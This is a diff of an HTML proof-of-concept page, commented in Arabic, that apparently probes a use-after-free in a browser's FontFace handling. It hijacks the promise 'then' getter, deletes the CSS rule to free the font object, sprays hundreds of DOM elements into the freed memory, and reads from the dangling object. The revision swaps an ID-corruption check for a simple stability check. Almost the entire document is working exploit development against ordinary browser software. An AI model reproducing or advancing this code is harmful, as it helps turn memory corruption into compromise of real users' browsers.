@@ -1,83 +1,68 @@
 <!DOCTYPE html>
 <html>
 <head>
-<style id="s">
-@font-face { font-family: 'targetFont'; src: url(nonexistent.woff); unicode-range: U+0042; }
-</style>
+    <style id="s">
+        @font-face { font-family: 'targetFont'; src: url(nonexistent.woff); unicode-range: U+0042; }
+    </style>
 </head>
 <body style="background: black; color: #0f0; font-family: monospace; padding: 20px;">
-    <div id="out">جاري تحديد عنصر الـ DOM المتداخل...</div>
+    <div id="out">جاري فحص الاستبدال عبر طبقة الـ DOM...</div>
     <div id="trash-bin" style="display: none;"></div>
 
-<script>
-window.onload = () => {
-    let A = new FontFace('targetFont', 'local(Helvetica)', { unicodeRange: 'U+0041' });
-    document.fonts.add(A);
-    void A.loaded;
+    <script>
+        window.onload = () => {
+            let A = new FontFace('targetFont', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+            document.fonts.add(A);
+            void A.loaded;
 
-    let callbackCount = 0;
-    let domElements = [];
-    let bin = document.getElementById('trash-bin');
+            let callbackCount = 0;
+            let domElements = [];
+            let bin = document.getElementById('trash-bin');
 
-    Object.defineProperty(FontFace.prototype, 'then', {
-        configurable: true,
-        get() {
-            if (this === A) {
-                callbackCount++;
-                
-                if (callbackCount === 1) { 
-                    // 1. تحرير كائن الخط
-                    document.getElementById('s').sheet.deleteRule(0);
-                    
-                    // 2. ضخ عناصر DOM مكثفة لشغل الحيز الذاكري
-                    for (let i = 0; i < 300; i++) {
-                        let el = document.createElement('div');
-                        el.id = "TARGET_" + i; // علامة مميزة
-                        el.className = "spray_class";
-                        bin.appendChild(el);
-                        domElements.push(el);
-                    }
-                    
-                    // 3. الفحص الدقيق للتداخل
-                    setTimeout(() => {
-                        let triggeredId = -1;
+            Object.defineProperty(FontFace.prototype, 'then', {
+                configurable: true,
+                get() {
+                    if (this === A) {
+                        callbackCount++;
                         
-                        try {
-                            // إجبار المحرك على القراءة من المؤشر الميت
-                            let test = A.family;
+                        if (callbackCount === 1) { 
+                            // 1. تحرير كائن الخط من طبقة الـ ++C
+                            document.getElementById('s').sheet.deleteRule(0);
                             
-                            // فحص عناصر الـ DOM لمعرفة هل تغيرت معرفاتها نتيجة القراءة من المؤشر الميت
-                            for (let j = 0; j < domElements.length; j++) {
-                                // إذا حدث تداخل، ستتأثر خصائص العنصر في الذاكرة
-                                if (domElements[j].id !== "TARGET_" + j) {
-                                    triggeredId = j;
-                                    break;
+                            // 2. محاولة ملء الفراغ بكائنات ++C موازية عبر الـ DOM
+                            for (let i = 0; i < 300; i++) {
+                                let el = document.createElement('div');
+                                el.id = "DOM_" + i; 
+                                el.className = "spray_class_test";
+                                
+                                // ربط العنصر بشجرة الـ DOM للحجز الفعلي
+                                bin.appendChild(el);
+                                domElements.push(el);
+                            }
+                            
+                            // 3. فحص استقرار الذاكرة بعد الاستبدال
+                            setTimeout(() => {
+                                try {
+                                    // محاولة القراءة من الكائن المحرر (المؤشر المعلق)
+                                    let testRead = A.family;
+                                    
+                                    // إذا لم ينهَرْ المتصفح، فهذا يشير إلى استقرار الذاكرة في هذه الطبقة
+                                    document.body.style.background = "#555500"; 
+                                    document.getElementById("out").innerText = "تم ملء الفراغ بكائنات DOM. المتصفح مستقر وقرأ الخاصية بنجاح.";
+                                    
+                                } catch(e) {
+                                    document.body.style.background = "red";
+                                    document.getElementById("out").innerText = "حدث خطأ في القراءة: " + e.message;
                                 }
-                            }
-                            
-                            if (triggeredId !== -1) {
-                                // نجاح التداخل الكامل!
-                                document.body.style.background = "purple"; // أرجواني
-                                document.getElementById("out").innerText = "نجاح قاطع! تم رصد التداخل في عنصر الـ DOM رقم: " + triggeredId;
-                            } else {
-                                // استقرار طبقي بدون تداخل مباشر في هذا الحجم
-                                document.body.style.background = "#555500"; // بني
-                                document.getElementById("out").innerText = "الاستبدال مستقر في طبقة الـ ++C، لكن لم يتم رصد تداخل مباشر في الـ ID حتى الآن. الحجم بحاجة لضبط.";
-                            }
-                            
-                        } catch(e) {
-                            document.body.style.background = "red";
-                            document.getElementById("out").innerText = "انهيار برمي: " + e.message;
+                            }, 0);
                         }
-                    }, 0);
+                    }
+                    return undefined;
                 }
-            }
-            return undefined;
-        }
-    });
+            });
 
-    document.fonts.load('1em targetFont', 'AB');
-};
-</script>
+            document.fonts.load('1em targetFont', 'AB');
+        };
+    </script>
 </body>
 </html>
